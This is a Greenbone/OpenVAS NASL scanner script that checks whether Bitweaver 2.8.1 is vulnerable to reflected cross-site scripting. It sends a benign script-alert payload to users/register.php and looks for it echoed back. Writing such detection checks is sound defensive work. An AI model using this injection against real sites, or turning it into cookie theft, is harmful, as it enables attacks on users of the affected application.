CPE = "cpe:/a:bitweaver:bitweaver";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103285" );
	script_version( "2019-12-05T15:10:00+0000" );
	script_tag( name: "last_modification", value: "2019-12-05 15:10:00 +0000 (Thu, 05 Dec 2019)" );
	script_tag( name: "creation_date", value: "2011-10-05 13:15:09 +0200 (Wed, 05 Oct 2011)" );
	script_bugtraq_id( 49864 );
	script_tag( name: "cvss_base", value: "2.6" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:N/I:P/A:N" );
	script_name( "Bitweaver Multiple Cross-Site Scripting Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/49864" );
	script_xref( name: "URL", value: "http://www.bitweaver.org/forums/index.php?t=12439" );
	script_xref( name: "URL", value: "http://www.bitweaver.org/" );
	script_xref( name: "URL", value: "http://www.rul3z.de/advisories/SSCHADV2011-021.txt" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/archive/1/519921" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "This script is Copyright (C) 2011 Greenbone Networks GmbH" );
	script_dependencies( "secpod_bitweaver_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Bitweaver/installed" );
	script_tag( name: "summary", value: "Bitweaver is prone to multiple cross-site scripting vulnerabilities
because it fails to properly sanitize user-supplied input.

An attacker may leverage these issues to execute arbitrary script code
in the browser of an unsuspecting user in the context of the affected
site. This may allow the attacker to steal cookie-based authentication
credentials and to launch other attacks.

Bitweaver 2.8.1 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("host_details.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
vt_strings = get_vt_strings();
url = NASLString( dir, "/users/register.php/\"</script><script>alert(/", vt_strings["lowercase"], "/)</script>" );
if(http_vuln_check( port: port, url: url, pattern: "<script>alert\\(/" + vt_strings["lowercase"] + "/\\)</script>", check_header: TRUE )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

